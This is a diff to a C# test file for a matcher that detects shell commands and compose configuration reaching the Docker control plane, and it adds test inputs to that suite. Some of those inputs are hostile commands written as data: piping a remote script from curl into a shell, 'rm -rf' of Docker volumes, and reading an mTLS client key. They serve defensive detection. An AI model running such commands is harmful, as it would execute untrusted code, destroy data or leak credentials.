@@ -74,6 +74,12 @@ public class ProtectedResourceMatcherTests
     [InlineData("docker stop whis{k,}ers")]
     [InlineData("docker stop 'unterminated")]
     [InlineData("sh -c 'docker stop $1' x whiskers")]
+    [InlineData("curl -s https://x/a.sh | sh")]                                   // a shell reading a pipe
+    [InlineData("(printf 'docker stop whis'; echo kers) | bash")]
+    [InlineData("bash ./deploy.sh")]                                            // or a file
+    [InlineData("bash <(curl -s https://x/a.sh)")]
+    [InlineData("cat x | sudo python3")]
+    [InlineData("cd /srv && . ./env.sh")]
     [InlineData("python3 -c \"import os; os.system('docker stop whis' + 'kers')\"")]
     [InlineData("perl -e 'system(\"docker\", \"stop\", \"whis\" . \"kers\")'")]
     [InlineData("awk 'BEGIN { system(\"docker stop whis\" \"kers\") }'")]
@@ -125,6 +131,11 @@ public class ProtectedResourceMatcherTests
     [InlineData("mounts", "/srv/a\n/run")]
     [InlineData("volumes", "//var/run/docker.sock:/s")]                       // unnormalised paths
     [InlineData("command", "curl --unix-socket /var/run/../run/docker.sock http://x/containers/json")]
+    [InlineData("command", "rm -rf /var/lib/docker/volumes")]                  // removing a directory above it
+    [InlineData("command", "mv /var/lib/docker /tmp/x")]
+    [InlineData("yaml", "services:\n  t:\n    volumes:\n      - ${UNSET:-/var/run/docker.sock}:/sock\n")]
+    [InlineData("yaml", "services:\n  t:\n    volumes:\n      - /:/rootfs:ro\n")]
+    [InlineData("yaml", "services:\n  t:\n    volumes:\n      - type: bind\n        source: /var/run\n        target: /r\n")]
     [InlineData("command", "cat /var/lib/docker/volumes/serverwatch-data/_data/mtls/client.key")]
     public void Paths_reaching_the_control_plane_are_found_however_they_are_written(string key, string value) =>
         Assert.NotNull(ControlPlane(key, value));
@@ -134,6 +145,9 @@ public class ProtectedResourceMatcherTests
     [InlineData("volumes", "./data:/app/data,/srv/certs:/etc/mtls")]          // the container side does not count
     [InlineData("envVars", "DATA_DIR=/app/data")]
     [InlineData("volumes", "/var/log:/host-logs:ro")]
+    [InlineData("command", "df -h /var/lib/docker")]                           // reading a directory above it
+    [InlineData("command", "rm -rf /tmp/build")]
+    [InlineData("yaml", "services:\n  t:\n    ports: [\"${PORT:-8080}:80\"]\n    volumes:\n      - ${DATA:-./data}:/data\n")]
     public void Ordinary_mounts_stay_allowed(string key, string value) => Assert.Null(ControlPlane(key, value));
 
     [Theory]
